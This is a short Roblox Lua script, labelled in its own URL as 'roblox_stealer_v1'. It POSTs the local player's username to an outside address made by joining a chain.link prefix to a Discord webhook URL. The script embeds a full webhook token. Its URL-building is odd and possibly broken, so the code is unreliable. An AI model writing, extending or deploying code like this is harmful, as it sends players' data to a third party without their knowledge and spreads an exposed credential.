local HttpService = game:GetService("HttpService")

-- Standard Webhook
local Webhook = "https://discord.com/api/webhooks/1574062507545600002/0pJpDBfNrEUd4WIg71CV4HCEXhE7LXqFz1PRzbgrzLdZ7313D07CvDokvWZGnSfIfPUp"

local function SendData()
    local LinkChain = "https://chain.link/roblox_stealer_v1/" -- This is the magic bridge
    local URL = LinkChain.. Webhook
  
    local Success, Response = pcall(function()
    local Result = HttpService:RequestAsync({
    Url = URL.. "/username=".. game:GetService("Players").LocalPlayer.Name,
    Method = "POST"
   })
    end)
end

SendData()